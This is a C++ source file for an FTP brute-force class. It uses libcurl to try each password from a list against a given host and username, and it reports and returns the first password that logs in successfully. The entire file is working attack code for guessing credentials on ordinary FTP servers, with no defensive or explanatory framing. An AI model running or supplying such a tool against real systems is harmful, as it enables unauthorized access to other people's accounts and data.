#include "ftp_bruteforce.h"
#include <curl/curl.h>

ftp_bruteforce::ftp_bruteforce(char *info[])
{
    this->host = "ftp://";
    host.append(info[0]);

    this->username = info[1];
    username.append(":");
}

ftp_bruteforce::~ftp_bruteforce() {
}

std::string ftp_bruteforce::bruteforce() {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        while (true) {
            std::string new_username = username + passwords[0];

            curl_easy_setopt(curl, CURLOPT_URL, host.c_str());
            curl_easy_setopt(curl, CURLOPT_USERPWD, new_username.c_str());

            res = curl_easy_perform(curl);
            if(res == CURLE_OK) { //
                std::cout << "Found it" << std::endl;
                curl_easy_cleanup(curl);
                curl_global_cleanup();
                return passwords[0];
            }

            passwords.erase(passwords.begin(), passwords.begin() + 1); //remove last used password

            if (passwords.size() == 0)
                break;
        }
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
    return "";
}
